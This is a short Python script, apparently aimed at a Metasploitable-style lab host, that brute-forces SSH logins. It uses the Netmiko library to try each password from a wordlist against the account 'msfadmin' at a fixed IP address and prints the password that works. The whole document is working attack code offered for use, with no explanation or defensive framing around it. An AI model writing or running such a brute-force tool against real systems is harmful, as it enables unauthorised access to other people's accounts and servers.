#!/usr/bin/python

from netmiko import Netmiko


wordlist = "word.txt"
user = 'msfadmin'
ip = '11.11.11.171'
print("[+] - SSH Burteforce Attack")
print("[+] - Target:", ip)

with open(wordlist,'r') as _wordlist:
    for _line in _wordlist:
        _pass = _line.strip("\n")

        try:
            sshconn = Netmiko(ip, username=user, password=_pass, device_type="linux")

            sshconn.disconnect()
            print('[+] BINGO - Username:', user, 'Passowrd:', _pass)
        except:
            print('[+] - FAIL - Username:', user, 'Password:', _pass)

